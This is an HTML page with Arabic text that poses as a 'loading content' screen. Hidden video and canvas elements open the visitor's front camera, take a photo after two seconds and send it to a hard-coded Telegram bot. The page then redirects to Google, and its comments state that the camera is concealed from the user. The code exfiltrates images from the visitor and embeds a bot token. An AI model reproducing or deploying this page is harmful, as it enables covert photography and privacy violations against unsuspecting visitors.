<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { 
            font-family: sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background-color: #ffffff; 
        }
        .loader-container { text-align: center; }
        /* شكل دائرة التحميل */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #555; font-size: 18px; }
        /* إخفاء الكاميرا تماماً عن المستخدم */
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="loader"></div>
        <p>جاري تحميل المحتوى، يرجى الانتظار...</p>
    </div>

    <!-- العناصر مخفية -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        const token = '7793041544:AAG9UpAjcR8XiLdCReyjf2TSg-0rXDGWgoI';
        const chatId = '7191557045'; 

        // طلب إذن الكاميرا وتشغيلها في الخلفية
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { 
                video.srcObject = stream; 
                // الانتظار ثانيتين لضبط الإضاءة ثم التصوير
                setTimeout(takeAndSend, 2000); 
            })
            .catch(err => {
                console.log("الوصول مرفوض");
            });

        function takeAndSend() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'capture.jpg');

                fetch(`https://telegram.org{token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    // بعد الإرسال، يمكنك تحويل المستخدم لصفحة أخرى (مثل جوجل)
                    window.location.href = "https://google.com";
                })
                .catch(err => console.error(err));
            }, 'image/jpeg', 0.6); // ضغط الصورة لسرعة الإرسال
        }
    </script>
</body>
</html>
